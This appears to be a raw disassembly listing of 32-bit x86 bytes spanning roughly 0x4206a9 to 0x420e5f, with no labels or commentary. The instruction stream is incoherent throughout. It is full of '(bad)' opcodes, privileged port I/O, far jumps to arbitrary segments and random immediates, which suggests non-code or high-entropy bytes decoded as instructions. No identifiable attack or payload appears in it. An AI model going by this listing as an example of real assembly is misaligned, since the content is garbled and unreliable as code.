  4206a9:	aam    0x4f
  4206ab:	mov    ebx,0xae12d68b
  4206b0:	cdq    
  4206b1:	inc    esi
  4206b2:	inc    esi
  4206b3:	xor    eax,0xcdda38a8
  4206b8:	stos   BYTE PTR es:[edi],al
  4206b9:	jge    0x4206d2
  4206bb:	sub    BYTE PTR [edx-0x5f8851c6],bh
  4206c1:	xchg   DWORD PTR [ebp+0x33f1b4ff],edi
  4206c7:	jo     0x420671
  4206c9:	jns    0x420666
  4206cb:	adc    eax,0x8579789e
  4206d0:	dec    esi
  4206d1:	repnz sub dl,BYTE PTR [edx-0x18]
  4206d5:	and    edi,DWORD PTR [edi-0x39]
  4206d8:	mov    dl,0xd6
  4206da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206db:	adc    bl,BYTE PTR [edi+0x10]
  4206de:	test   BYTE PTR [ecx+0x8a3ef84],dh
  4206e4:	xlat   BYTE PTR ds:[ebx]
  4206e5:	imul   ebx,DWORD PTR [ecx],0xffffff88
  4206e8:	inc    edi
  4206e9:	sub    ebx,DWORD PTR [ebx-0x6e382a8d]
  4206ef:	sub    al,BYTE PTR [ecx+0x14268f44]
  4206f5:	out    0x21,eax
  4206f7:	shl    BYTE PTR [eax+eax*1+0x7cc2f7c9],1
  4206fe:	mov    dh,0x79
  420700:	(bad)  
  420701:	jmp    0x4206cc
  420703:	jmp    0x39dfc7a2
  420708:	mov    ah,0xe2
  42070a:	xor    bh,BYTE PTR [edi+0x77]
  42070d:	xor    eax,0x8d75bfe
  420712:	or     eax,0x4fbe4a64
  420717:	in     al,dx
  420718:	cli    
  420719:	test   BYTE PTR [edx+0x25302dbb],cl
  42071f:	mov    ds:0x77aec23d,al
  420724:	dec    esp
  420725:	xor    eax,0xeadfad66
  42072a:	and    DWORD PTR [ebx],0x3f8acc
  420730:	push   eax
  420731:	pop    ss
  420732:	xor    DWORD PTR gs:[edi+0x39],esi
  420736:	pushf  
  420737:	add    BYTE PTR [edi],0x77
  42073a:	push   esp
  42073b:	jne    0x42076c
  42073d:	sahf   
  42073e:	xchg   ecx,eax
  42073f:	aas    
  420740:	add    al,0x4a
  420742:	sbb    eax,0x1ad0ebef
  420747:	mov    al,0xc8
  420749:	and    ah,dh
  42074b:	dec    ecx
  42074c:	sub    al,0xa
  42074e:	fwait
  42074f:	inc    eax
  420750:	mov    eax,ds:0xe0affdde
  420755:	fisttp QWORD PTR [ecx+0x10]
  420758:	sahf   
  420759:	fsubr  DWORD PTR [edi]
  42075b:	adc    edx,DWORD PTR [ecx+ebx*8]
  42075e:	xchg   ebp,eax
  42075f:	jg     0x420753
  420761:	xchg   edi,eax
  420762:	jecxz  0x4206f1
  420764:	pushf  
  420765:	stos   BYTE PTR es:[edi],al
  420766:	or     eax,0xf8b7cf8a
  42076b:	sub    al,0x1b
  42076d:	mov    dl,0x22
  42076f:	fmul   QWORD PTR [edx-0x1719f10b]
  420775:	nop
  420776:	sub    eax,0xc9ed9671
  42077b:	mov    dh,BYTE PTR [eax-0x268fca62]
  420781:	ss out dx,eax
  420783:	sub    al,0x50
  420785:	cld    
  420786:	xor    BYTE PTR [ebx],bh
  420788:	xchg   ebx,eax
  420789:	xchg   edx,eax
  42078a:	add    DWORD PTR [esi],edi
  42078c:	sub    eax,eax
  42078e:	jecxz  0x4207db
  420790:	mov    ds:0xde2ee3a0,eax
  420795:	addr16 add eax,0xffdc20b
  42079b:	pushf  
  42079c:	mov    ebx,0x86a0d5b8
  4207a1:	fcmovbe st,st(6)
  4207a3:	push   ds
  4207a4:	push   eax
  4207a5:	scas   eax,DWORD PTR es:[edi]
  4207a6:	xchg   ebp,eax
  4207a7:	hlt    
  4207a8:	out    0x52,al
  4207aa:	xchg   esp,eax
  4207ab:	add    BYTE PTR [ebx+0x7708f1c6],dl
  4207b1:	pop    ebx
  4207b2:	in     eax,dx
  4207b3:	or     dh,BYTE PTR [edi-0x4c]
  4207b6:	jmp    0x78a8:0x637780a7
  4207bd:	ror    DWORD PTR [ebx+edx*2],1
  4207c0:	and    al,0x5e
  4207c2:	lds    edi,FWORD PTR [esi+eiz*2]
  4207c5:	push   0xffffff9c
  4207c7:	dec    edx
  4207c8:	pop    edx
  4207c9:	fisub  WORD PTR [eax+eiz*8]
  4207cc:	push   ss
  4207cd:	fcomip st,st(1)
  4207cf:	mov    bh,0xef
  4207d1:	jb     0x420818
  4207d3:	sbb    DWORD PTR [esi+esi*2],ebx
  4207d6:	xor    edx,DWORD PTR [edx]
  4207d8:	mov    ebp,0xc889e8d2
  4207dd:	xchg   esp,eax
  4207de:	outs   dx,DWORD PTR ds:[esi]
  4207df:	add    BYTE PTR [eax],0xb4
  4207e2:	int3   
  4207e3:	into   
  4207e4:	imul   ebp,DWORD PTR [esi],0x56f5497c
  4207ea:	out    dx,al
  4207eb:	loop   0x42079c
  4207ed:	or     BYTE PTR [ebx],bl
  4207ef:	and    al,0xe2
  4207f1:	idiv   DWORD PTR [edi+0xee0eefe]
  4207f7:	add    DWORD PTR [ecx],ebx
  4207f9:	stos   BYTE PTR es:[edi],al
  4207fa:	int3   
  4207fb:	and    eax,0x71f927d1
  420800:	mov    ds:0x16c3b7c4,al
  420805:	mov    edx,0x8ba97945
  42080a:	dec    edi
  42080b:	xchg   ebp,eax
  42080c:	into   
  42080d:	sbb    eax,0xb7235e7b
  420812:	push   0xbf9aa3a7
  420817:	(bad)  
  420818:	cmp    al,0xbf
  42081a:	ins    DWORD PTR es:[edi],dx
  42081b:	js     0x42086b
  42081d:	mov    dl,0x8b
  42081f:	stos   DWORD PTR es:[edi],eax
  420820:	fwait
  420821:	js     0x420800
  420823:	xchg   ecx,eax
  420824:	cmp    al,BYTE PTR [edi+ebx*8+0x4f]
  420828:	ins    BYTE PTR es:[edi],dx
  420829:	das    
  42082a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42082b:	call   0x9ca9:0x616940ea
  420832:	dec    ebp
  420833:	(bad)  
  420835:	add    eax,0xb9f4092d
  42083a:	inc    edi
  42083b:	cs out dx,al
  42083d:	shl    bh,cl
  42083f:	adc    edx,ecx
  420841:	out    dx,eax
  420842:	(bad)  
  420843:	ins    DWORD PTR es:[edi],dx
  420844:	pop    ecx
  420845:	ss sbb eax,0x19c56732
  42084b:	div    BYTE PTR [ecx+0x56]
  42084e:	mov    ecx,0xd0b3a29e
  420853:	(bad)  
  420854:	xrelease xchg DWORD PTR [edi-0x75],ebx
  420858:	cmp    al,0x19
  42085a:	(bad)  
  42085b:	or     al,0x71
  42085d:	sti    
  42085e:	call   0x3ba9c362
  420863:	stc    
  420864:	(bad)  
  420866:	call   DWORD PTR [eax+0x1afe9a43]
  42086c:	and    ecx,DWORD PTR [eax+0xad7350b]
  420872:	jne    0x420878
  420874:	inc    edi
  420875:	in     al,0x68
  420877:	out    0x59,al
  420879:	jnp    0x420857
  42087b:	aam    0xb3
  42087d:	xor    al,0xc3
  42087f:	jg     0x420874
  420881:	pop    ss
  420882:	adc    dl,cl
  420884:	lock pusha 
  420886:	arpl   bp,si
  420888:	inc    ebp
  420889:	test   eax,0x5d3efca0
  42088e:	inc    ecx
  42088f:	loopne 0x420845
  420891:	neg    BYTE PTR [eax]
  420893:	dec    esi
  420894:	cmp    BYTE PTR [ecx+0x61c68c75],cl
  42089a:	fldcw  WORD PTR [ecx+0x2c]
  42089d:	pop    es
  42089e:	push   ecx
  42089f:	ins    BYTE PTR es:[edi],dx
  4208a0:	and    eax,0xdbda7df2
  4208a5:	fistp  DWORD PTR [ebx+0x4a07e12b]
  4208ab:	and    bh,BYTE PTR [edx-0x2ace7b4]
  4208b1:	push   ebp
  4208b2:	and    al,0x49
  4208b4:	mov    esp,0x4fcc8679
  4208b9:	test   eax,0x4b8a1d3
  4208be:	je     0x4208f8
  4208c0:	cmp    DWORD PTR [ecx-0x39c1e932],esi
  4208c6:	fisub  WORD PTR [ebx+ebx*8-0x10]
  4208ca:	neg    DWORD PTR [ebx]
  4208cc:	lea    edx,[ecx-0x55]
  4208cf:	mov    ecx,0x9c283c93
  4208d4:	mov    ds:0x20b61540,al
  4208d9:	sahf   
  4208da:	pop    ds
  4208db:	outs   dx,BYTE PTR ds:[esi]
  4208dc:	mov    ebp,edx
  4208de:	jne    0x420910
  4208e0:	(bad)  
  4208e1:	fmul   st(7),st
  4208e3:	jecxz  0x4208b6
  4208e5:	inc    edx
  4208e6:	data16 (bad) 
  4208e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208e9:	jg     0x420944
  4208eb:	push   cs
  4208ec:	mov    dh,0x3b
  4208ee:	ror    DWORD PTR [edx],cl
  4208f0:	(bad)  [eax-0x714d73bd]
  4208f6:	add    eax,0x92c500bb
  4208fb:	cmp    al,0x6a
  4208fd:	fadd   DWORD PTR [eax+0x7a09d79b]
  420903:	out    dx,al
  420904:	enter  0xd711,0x32
  420908:	mov    ch,0xd0
  42090a:	inc    edx
  42090b:	jmp    0x4208b3
  42090d:	fld    DWORD PTR [esi-0x4aaa9748]
  420913:	pop    ds
  420914:	(bad)  
  420916:	test   eax,0xb804202c
  42091b:	ds fdiv st,st(4)
  42091e:	int    0x1f
  420920:	jnp    0x42090a
  420922:	xlat   BYTE PTR ds:[ebx]
  420923:	outs   dx,BYTE PTR ds:[esi]
  420924:	push   ebx
  420925:	inc    ebp
  420926:	cmp    eax,0x435cc6a8
  42092b:	fbld   TBYTE PTR [eax+0x6d]
  42092e:	ins    BYTE PTR es:[edi],dx
  42092f:	mov    dl,0xdc
  420931:	(bad)  
  420933:	fisttp WORD PTR [ebx+esi*8-0x74]
  420937:	mov    eax,ds:0x8e9c9991
  42093c:	dec    esi
  42093d:	push   0xffffff85
  42093f:	or     bl,BYTE PTR [edi+0x6b]
  420942:	mov    cl,0x27
  420944:	cli    
  420945:	imul   BYTE PTR [ecx-0x27b91c6c]
  42094b:	movhps QWORD PTR [ecx],xmm1
  42094e:	mov    BYTE PTR [ebp-0x5fd0488f],ch
  420954:	adc    ecx,edx
  420956:	xchg   ebx,eax
  420957:	push   ecx
  420958:	inc    ebp
  420959:	sbb    edx,edi
  42095b:	pop    ss
  42095c:	dec    esp
  42095d:	sub    DWORD PTR [ecx-0x60],edx
  420960:	adc    cl,BYTE PTR [edi+ebp*4+0x21]
  420964:	loop   0x4209c2
  420966:	popa   
  420967:	xchg   edx,eax
  420968:	add    al,0xe5
  42096a:	cmp    edx,ebx
  42096c:	sub    DWORD PTR [esi-0xfc42829],esp
  420972:	pop    eax
  420973:	jp     0x420925
  420975:	xchg   BYTE PTR [edx+edx*2+0xe14df33],al
  42097c:	mov    cl,0xe9
  42097e:	pusha  
  42097f:	push   ss
  420980:	fisub  DWORD PTR [ecx+ebp*2]
  420983:	adc    ah,BYTE PTR [ebx+0x4bd0bb37]
  420989:	mov    dl,BYTE PTR [ebp+0x54]
  42098c:	mov    eax,ds:0xe93ca761
  420991:	sahf   
  420992:	call   0xfd9e:0x88e41c6c
  420999:	cdq    
  42099a:	stos   DWORD PTR es:[edi],eax
  42099b:	jns    0x42096b
  42099d:	adc    al,cl
  42099f:	jmp    0x420927
  4209a1:	es jmp 0x420967
  4209a4:	scas   al,BYTE PTR es:[edi]
  4209a5:	scas   al,BYTE PTR es:[edi]
  4209a6:	clc    
  4209a7:	mov    ch,0x88
  4209a9:	inc    eax
  4209aa:	outs   dx,DWORD PTR ds:[esi]
  4209ab:	jno    0x4209f9
  4209ad:	xor    esp,DWORD PTR [esi-0x4a]
  4209b0:	adc    BYTE PTR [ebp+0x674e66f6],0xdb
  4209b7:	pop    ebx
  4209b8:	xchg   ecx,eax
  4209b9:	rcpps  xmm5,XMMWORD PTR [esi-0x72865587]
  4209c0:	nop
  4209c1:	dec    edx
  4209c2:	sub    WORD PTR [esi+0x3985cd5a],si
  4209c9:	and    eax,0x9985cf3c
  4209ce:	push   eax
  4209cf:	jmp    0x420a04
  4209d1:	adc    BYTE PTR es:[ebp+0x6],0x6b
  4209d6:	(bad)  
  4209d7:	or     DWORD PTR [edx+edx*8-0x777a6957],edx
  4209de:	pusha  
  4209df:	or     DWORD PTR [ebx+edi*1],ebp
  4209e2:	into   
  4209e3:	jmp    0xcc90c046
  4209e8:	clc    
  4209e9:	push   eax
  4209ea:	aad    0x6b
  4209ec:	pop    esi
  4209ed:	dec    eax
  4209ee:	loop   0x4209aa
  4209f0:	push   ss
  4209f1:	lock dec sp
  4209f4:	sub    al,0x40
  4209f6:	fcom   QWORD PTR [esi]
  4209f8:	xor    DWORD PTR [esi+0x1ac3843c],edx
  4209fe:	mov    ds:0x3dc4640b,al
  420a03:	pop    ss
  420a04:	rcl    BYTE PTR [ebp+eiz*1+0x771fe725],cl
  420a0b:	or     bh,BYTE PTR [eax-0x74]
  420a0e:	enter  0xf9d6,0x73
  420a12:	xlat   BYTE PTR ds:[ebx]
  420a13:	(bad)  
  420a14:	dec    edi
  420a15:	xchg   esi,eax
  420a16:	lock iret 
  420a18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a19:	call   0x13bf:0xb2bb802a
  420a20:	jae    0x4209f4
  420a22:	js     0x420a5c
  420a24:	mov    eax,ds:0x3ca2f745
  420a29:	loope  0x4209b2
  420a2b:	not    esp
  420a2d:	dec    ecx
  420a2e:	cs in  eax,0x0
  420a31:	xchg   edx,eax
  420a32:	mov    ebp,DWORD PTR [edx+eax*2]
  420a35:	aaa    
  420a36:	or     bh,bl
  420a38:	push   eax
  420a39:	ds call 0x6aab:0x82c5bd64
  420a41:	inc    esp
  420a42:	pop    esp
  420a43:	adc    BYTE PTR [edi],dl
  420a45:	xor    bh,BYTE PTR [esi]
  420a47:	and    DWORD PTR [eax+0x222bd254],ecx
  420a4d:	inc    edi
  420a4e:	ins    DWORD PTR es:[edi],dx
  420a4f:	sbb    DWORD PTR [ecx+0x5c],ebx
  420a52:	dec    esp
  420a53:	neg    DWORD PTR [esi-0x3a5d3f41]
  420a59:	je     0x420a6e
  420a5b:	jae    0x420a01
  420a5d:	nop
  420a5e:	push   esi
  420a5f:	mov    WORD PTR [edx+0x30],?
  420a62:	imul   esi,DWORD PTR [edx-0x3a],0x7770c556
  420a69:	shl    eax,cl
  420a6b:	les    edi,FWORD PTR [edi]
  420a6d:	std    
  420a6e:	shr    BYTE PTR [ebx-0x37],1
  420a71:	lahf   
  420a72:	cdq    
  420a73:	xor    BYTE PTR [ecx+0x55],ah
  420a76:	mov    ch,0xdf
  420a78:	mov    ah,0xd9
  420a7a:	mov    ebp,0x75551c1d
  420a7f:	jb     0x420a5c
  420a81:	push   cs
  420a82:	push   eax
  420a83:	fsubr  DWORD PTR [eax-0x200f05d9]
  420a89:	scas   eax,DWORD PTR es:[edi]
  420a8a:	clc    
  420a8b:	dec    edx
  420a8c:	jne    0x420aac
  420a8e:	lods   al,BYTE PTR ds:[esi]
  420a8f:	jg     0x420a4b
  420a91:	push   esi
  420a92:	and    ah,BYTE PTR [esi]
  420a94:	stos   DWORD PTR es:[edi],eax
  420a95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a96:	fcom   DWORD PTR [esi]
  420a98:	pop    eax
  420a99:	dec    esp
  420a9a:	in     eax,0x84
  420a9c:	cmp    bh,dl
  420a9e:	adc    al,0x69
  420aa0:	scas   eax,DWORD PTR es:[edi]
  420aa1:	aam    0x4f
  420aa3:	loop   0x420aaa
  420aa5:	mov    ebx,0x9e9b2a71
  420aaa:	xchg   ebx,eax
  420aab:	mov    bl,0x41
  420aad:	stc    
  420aae:	push   DWORD PTR [ebp+0x60a864c0]
  420ab4:	leave  
  420ab5:	cli    
  420ab6:	aas    
  420ab7:	cld    
  420ab8:	push   edi
  420ab9:	push   0x76291ae
  420abe:	mov    BYTE PTR [ebp+0x6f8f4af2],dh
  420ac4:	sbb    ebp,DWORD PTR [eax-0x79]
  420ac7:	add    eax,0x2a626952
  420acc:	lahf   
  420acd:	or     eax,0xcd9fd967
  420ad2:	adc    esp,edx
  420ad4:	shl    esp,cl
  420ad6:	dec    ebp
  420ad7:	sub    DWORD PTR [edi+0x3],0xffffffe7
  420adb:	xchg   ebx,eax
  420adc:	push   es
  420add:	jle    0x420af0
  420adf:	nop
  420ae0:	pop    ebp
  420ae1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ae2:	dec    eax
  420ae3:	and    esp,DWORD PTR [ebp+eiz*4+0x5efe6043]
  420aea:	xchg   ecx,eax
  420aeb:	inc    esp
  420aec:	std    
  420aed:	dec    ecx
  420aee:	into   
  420aef:	mov    bh,0x10
  420af1:	push   ecx
  420af2:	lds    eax,FWORD PTR ds:0xedea8a71
  420af8:	jecxz  0x420ac5
  420afa:	stos   BYTE PTR es:[edi],al
  420afb:	xchg   ch,cl
  420afd:	sub    DWORD PTR [edx],edi
  420aff:	pop    esi
  420b00:	push   ds
  420b01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b03:	or     BYTE PTR [edx+0x1a],0x82
  420b07:	inc    ebp
  420b08:	pop    esp
  420b09:	retf   0x555b
  420b0c:	stos   DWORD PTR es:[edi],eax
  420b0d:	push   edx
  420b0e:	loopne 0x420b11
  420b10:	aas    
  420b11:	sub    DWORD PTR [eax],edi
  420b13:	fld    QWORD PTR [edx+eax*8+0x4bd978ca]
  420b1a:	add    eax,0x3f9df1e8
  420b1f:	sar    BYTE PTR [ebp+0x46],cl
  420b22:	xchg   DWORD PTR [eax-0x7e6b5459],eax
  420b28:	mov    WORD PTR [ecx-0x7b],es
  420b2b:	sub    edi,0x7d
  420b2e:	cmp    bl,bh
  420b30:	into   
  420b31:	shl    DWORD PTR [esi-0x58],1
  420b34:	int    0xb
  420b36:	lahf   
  420b37:	or     al,BYTE PTR [esi-0x365b0703]
  420b3d:	adc    ecx,edi
  420b3f:	sbb    eax,0x118aca71
  420b44:	js     0x420b51
  420b46:	sbb    eax,0xe91f9776
  420b4b:	aas    
  420b4c:	fist   DWORD PTR [ebx-0x72]
  420b4f:	sub    al,0x85
  420b51:	pop    ss
  420b52:	push   ss
  420b53:	std    
  420b54:	mov    WORD PTR [eax-0x9],gs
  420b57:	or     dh,BYTE PTR [eax]
  420b59:	mov    edi,DWORD PTR [bx+si+0x18]
  420b5d:	sbb    al,0x43
  420b5f:	aad    0x1e
  420b61:	ret    
  420b62:	ja     0x420ba0
  420b64:	mov    edx,0x2fe3414c
  420b69:	sahf   
  420b6a:	loop   0x420b60
  420b6c:	popf   
  420b6d:	cdq    
  420b6e:	imul   esp,DWORD PTR [ebp+0x19],0xffffffbe
  420b72:	cmc    
  420b73:	add    al,0xc4
  420b75:	adc    DWORD PTR [ebx+0x3083b232],esi
  420b7b:	sub    DWORD PTR [esi+0x10],esp
  420b7e:	ins    BYTE PTR es:[edi],dx
  420b7f:	jl     0x420b40
  420b81:	adc    edi,DWORD PTR [ecx-0x72bfda8e]
  420b87:	dec    esi
  420b88:	aad    0xb6
  420b8a:	xor    al,0x59
  420b8c:	jb     0x420b1c
  420b8e:	das    
  420b8f:	mov    bl,0xdb
  420b91:	mov    dh,0xf
  420b93:	or     eax,DWORD PTR [ecx]
  420b95:	mov    edi,0xcbacff07
  420b9a:	mov    es,WORD PTR [ecx+edi*2]
  420b9d:	loope  0x420bb4
  420b9f:	(bad)  
  420ba0:	xlat   BYTE PTR ds:[ebx]
  420ba1:	sbb    eax,0xc81bfb72
  420ba6:	sahf   
  420ba7:	call   0xdffe0a9
  420bac:	and    BYTE PTR [eax-0x1ab17b36],ch
  420bb2:	adc    dl,bh
  420bb4:	retf   0x85d7
  420bb7:	push   eax
  420bb8:	int    0x1b
  420bba:	jne    0x420b3d
  420bbc:	xor    eax,0xc20238f5
  420bc1:	cwde   
  420bc2:	repz in eax,0x29
  420bc5:	mov    al,ds:0x4e07ed17
  420bca:	sub    eax,0x29ecdd40
  420bcf:	and    al,0xd1
  420bd1:	jne    0x420b83
  420bd3:	push   es
  420bd4:	icebp  
  420bd5:	repnz pop ss
  420bd7:	mov    esp,0x823eda2
  420bdc:	add    eax,DWORD PTR [ebx+0x49]
  420bdf:	ret    0xdd39
  420be2:	xor    DWORD PTR [ebx],0xffffff85
  420be5:	jnp    0x420bae
  420be7:	sar    DWORD PTR [edi+0x41],1
  420bea:	sbb    edx,DWORD PTR [ecx]
  420bec:	addr16 inc ecx
  420bee:	push   cs
  420bef:	sub    BYTE PTR [ecx+0x42],bh
  420bf2:	add    esp,DWORD PTR [edx-0x44]
  420bf5:	cmc    
  420bf6:	mov    gs,WORD PTR [edx-0x5b]
  420bf9:	mov    ah,BYTE PTR [ecx+0x3fa7b836]
  420bff:	mov    edi,0xdf19d740
  420c04:	pop    ds
  420c05:	adc    BYTE PTR [edx-0x64],bl
  420c08:	inc    esi
  420c09:	repz call 0xf9419f11
  420c0f:	(bad)  [eax-0x15]
  420c12:	jl     0x420c72
  420c14:	ret    
  420c15:	ret    
  420c16:	and    ebp,ebx
  420c18:	mov    cl,0x11
  420c1a:	pop    ecx
  420c1b:	adc    eax,0xf942cc2d
  420c20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c21:	or     al,0xca
  420c23:	ret    0xbf1c
  420c26:	call   0x69618e35
  420c2b:	aas    
  420c2c:	sbb    cl,ah
  420c2e:	mov    dl,0x6b
  420c30:	pop    es
  420c31:	jp     0x420bfc
  420c33:	in     eax,0x11
  420c35:	add    DWORD PTR [edi-0x9],0x32067902
  420c3c:	loop   0x420c69
  420c3e:	inc    eax
  420c3f:	lahf   
  420c40:	mov    ebx,0x57c7acf5
  420c45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c46:	mov    ebx,0x91fe4c27
  420c4b:	mov    esp,0xdd16e38e
  420c50:	aam    0xa5
  420c52:	arpl   ax,bx
  420c54:	into   
  420c55:	add    ch,BYTE PTR [eax+0x2]
  420c58:	ret    0xdb4b
  420c5b:	sti    
  420c5c:	dec    edi
  420c5d:	cmp    eax,0x4108974b
  420c62:	int    0x19
  420c64:	sub    DWORD PTR [esi],eax
  420c66:	jmp    0xd284:0x944e772d
  420c6d:	add    esi,edi
  420c6f:	jno    0x420c63
  420c71:	xlat   BYTE PTR ds:[ebx]
  420c72:	js     0x420c87
  420c74:	cmc    
  420c75:	add    al,0x6b
  420c77:	xchg   edi,eax
  420c78:	shl    BYTE PTR [edx+esi*2+0xea2dac],0xbf
  420c80:	test   DWORD PTR [edi+0x45],esi
  420c83:	jne    0x420c8c
  420c85:	cmp    bl,BYTE PTR [eax]
  420c87:	mov    es,WORD PTR [eax+edi*2]
  420c8a:	popf   
  420c8b:	xor    ebp,DWORD PTR [edi]
  420c8d:	lds    ebx,FWORD PTR [edi+0x39beb1f6]
  420c93:	xchg   BYTE PTR [ecx+0x308e1588],al
  420c99:	fwait
  420c9a:	inc    edx
  420c9b:	mov    es,edx
  420c9d:	(bad)  
  420c9f:	pop    esi
  420ca0:	mov    ecx,0xdc2c1306
  420ca5:	xchg   edx,ebp
  420ca7:	dec    ecx
  420ca8:	dec    eax
  420ca9:	je     0x420d28
  420cab:	adc    al,0xf1
  420cad:	in     al,0x40
  420caf:	sub    BYTE PTR [edx],0xbc
  420cb2:	and    BYTE PTR ds:0xbc62427d,bl
  420cb8:	dec    ebp
  420cb9:	inc    esp
  420cba:	nop
  420cbb:	mov    edi,0x59e3f285
  420cc0:	mov    ch,0x19
  420cc2:	inc    ebx
  420cc3:	fisttp WORD PTR [eax]
  420cc5:	jns    0x420c9f
  420cc7:	inc    ecx
  420cc8:	adc    al,0x6
  420cca:	push   es
  420ccb:	aaa    
  420ccc:	cld    
  420ccd:	nop
  420cce:	out    dx,al
  420ccf:	mov    al,ds:0xe70d8047
  420cd4:	icebp  
  420cd5:	xor    edi,edi
  420cd7:	js     0x420d11
  420cd9:	addr16 fs push ebx
  420cdc:	cdq    
  420cdd:	sti    
  420cde:	rcl    BYTE PTR [ebx-0x8c5a838],1
  420ce4:	sbb    esp,eax
  420ce6:	icebp  
  420ce7:	std    
  420ce8:	push   ds
  420ce9:	in     al,0xf1
  420ceb:	lar    esp,WORD PTR [edx+0x35]
  420cef:	pop    ss
  420cf0:	icebp  
  420cf1:	ss mov esp,0xbb10c148
  420cf7:	mov    eax,ds:0x31048d85
  420cfc:	icebp  
  420cfd:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  420cff:	dec    ebx
  420d00:	sbb    BYTE PTR [edi+eiz*2-0x73],ch
  420d04:	adc    eax,0x1358406b
  420d09:	les    ebx,FWORD PTR [edi+0x42b3bc25]
  420d0f:	pop    edx
  420d10:	(bad)  
  420d11:	lock sar DWORD PTR [eax-0x324cdfb9],cl
  420d18:	or     al,0x2e
  420d1a:	fild   WORD PTR [esi]
  420d1c:	les    ebp,FWORD PTR [ebx-0x8051757]
  420d22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d23:	sub    BYTE PTR [ebx+0x5016c382],ah
  420d29:	cmp    edx,edi
  420d2b:	adc    eax,0x6616c13a
  420d30:	aas    
  420d31:	dec    edx
  420d32:	adc    DWORD PTR [eax+0x3a57677],edi
  420d38:	(bad)  
  420d39:	dec    eax
  420d3a:	aaa    
  420d3b:	ret    
  420d3c:	jp     0x420d4a
  420d3e:	push   eax
  420d3f:	xchg   ebp,eax
  420d40:	ins    DWORD PTR es:[edi],dx
  420d41:	ja     0x420db5
  420d43:	and    BYTE PTR [edi],bh
  420d45:	mov    edi,0xc74f1e43
  420d4a:	dec    ebp
  420d4b:	std    
  420d4c:	repnz dec ebp
  420d4e:	add    al,0x45
  420d50:	xor    DWORD PTR [ebp-0x2c6de132],ecx
  420d56:	cmp    BYTE PTR [edi-0x22df1dd8],bl
  420d5c:	sub    al,0xe0
  420d5e:	fwait
  420d5f:	clc    
  420d60:	imul   ebx,DWORD PTR [edx+0x79c57fcb],0xcbd9fd8b
  420d6a:	jmp    0x420d11
  420d6c:	shl    BYTE PTR [esi+0x19a22ba7],1
  420d72:	sub    BYTE PTR [edx+0x57f40c96],bh
  420d78:	je     0x420d76
  420d7a:	push   ds
  420d7b:	inc    esp
  420d7c:	add    eax,esp
  420d7e:	push   cs
  420d7f:	xchg   esp,eax
  420d80:	dec    esi
  420d81:	jmp    FWORD PTR [edi+0x5c]
  420d84:	cli    
  420d85:	mov    esi,0xe77e1420
  420d8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d8b:	pop    ds
  420d8c:	enterw 0x1e6b,0x41
  420d91:	pop    esp
  420d92:	sub    al,0x4d
  420d94:	xchg   ecx,eax
  420d95:	jmp    0x420dc9
  420d97:	fwait
  420d98:	sub    eax,DWORD PTR [ebp+ebx*2-0x2b]
  420d9c:	adc    BYTE PTR ds:[ebx-0x22],ah
  420da0:	push   ds
  420da1:	rcr    DWORD PTR [eax],0xa
  420da4:	lock ins DWORD PTR es:[edi],dx
  420da6:	retf   0x6a67
  420da9:	and    DWORD PTR [ebp-0xf1dea69],0xffffffa5
  420db0:	aam    0x6d
  420db2:	jmp    0xc4ad4a0c
  420db7:	aaa    
  420db8:	test   eax,0xe556d45d
  420dbd:	adc    DWORD PTR [esi+0x1e639d80],0xf4cda75b
  420dc7:	pop    ebp
  420dc8:	call   0x6f30:0x553cb39b
  420dcf:	(bad)  
  420dd0:	and    DWORD PTR [ebx],esp
  420dd2:	test   esi,ebx
  420dd4:	retf   0x8173
  420dd7:	pusha  
  420dd8:	sbb    edx,DWORD PTR [eax]
  420dda:	and    edx,ecx
  420ddc:	leave  
  420ddd:	std    
  420dde:	jmp    0x4ee264e
  420de3:	call   0xf2176911
  420de8:	aad    0xf3
  420dea:	adc    eax,0x7663387e
  420def:	fisub  DWORD PTR [edx]
  420df1:	pop    ss
  420df2:	out    dx,eax
  420df3:	shl    BYTE PTR [eax+0x21],cl
  420df6:	push   edx
  420df7:	popa   
  420df8:	xlat   BYTE PTR ds:[ebx]
  420df9:	mov    dl,0x2c
  420dfb:	retf   
  420dfc:	iret   
  420dfd:	inc    edx
  420dfe:	sub    esi,DWORD PTR [edi+0x1]
  420e01:	inc    ebp
  420e02:	mov    edx,0x7be71e6d
  420e07:	jo     0x420d91
  420e09:	add    DWORD PTR ds:0xc62ecf4,edi
  420e0f:	aas    
  420e10:	sbb    eax,0xe489c193
  420e15:	out    dx,al
  420e16:	cs scas eax,DWORD PTR es:[edi]
  420e18:	mov    edx,0x3e2e93f7
  420e1d:	mov    dl,0xc7
  420e1f:	sub    BYTE PTR [esi],ah
  420e21:	push   0x57
  420e23:	xchg   ebx,eax
  420e24:	fnsave [esi-0x14]
  420e27:	adc    edx,DWORD PTR [edx-0x20251753]
  420e2d:	xchg   ebp,eax
  420e2e:	adc    DWORD PTR [eax+ecx*8],ebp
  420e31:	dec    ebp
  420e32:	cmp    BYTE PTR [ebp-0x16],ah
  420e35:	fsub   st,st(3)
  420e37:	mov    dl,0x30
  420e39:	push   ebx
  420e3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e3b:	sub    edx,eax
  420e3d:	loope  0x420e53
  420e3f:	fyl2xp1 
  420e41:	dec    edi
  420e42:	ret    0x7
  420e45:	mov    eax,0x3e80a74f
  420e4a:	ins    DWORD PTR es:[edi],dx
  420e4b:	inc    esi
  420e4c:	or     edi,esp
  420e4e:	jmp    0x420e2e
  420e50:	stos   DWORD PTR es:[edi],eax
  420e51:	in     eax,0xa2
  420e53:	dec    ebp
  420e54:	rol    DWORD PTR [edi],1
  420e56:	pop    esi
  420e57:	cmc    
  420e58:	push   0xd
  420e5a:	sbb    BYTE PTR cs:[esi-0x54],0xb
  420e5f:	call   0xd603:0x68c5e04a
